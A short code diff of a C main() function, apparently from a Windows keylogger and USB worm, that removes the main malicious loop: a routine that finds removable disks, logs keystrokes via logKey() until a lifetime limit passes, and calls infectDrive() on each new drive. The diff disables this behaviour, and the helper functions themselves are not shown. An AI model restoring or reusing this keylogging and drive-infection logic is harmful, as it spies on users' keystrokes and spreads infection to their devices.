@@ -68,22 +68,7 @@ main(){
         logUserTime();
     }
 
-    char driveLetter = getRemovableDisk(); ///initial search for all disks
-    return; // :)
-    while(1){
-        ////////////****LOG KEY****////////////
-        if(age <= LIFE_TIME){
-            logKey();
-        }else{
-            Sleep(5000);
-        }
-
-        ////////////****INFECT****////////////
-        driveLetter = getRemovableDisk();
-        if(driveLetter!='0'){
-            infectDrive(driveLetter);
-        }
-    }
+ 
     
 }
 
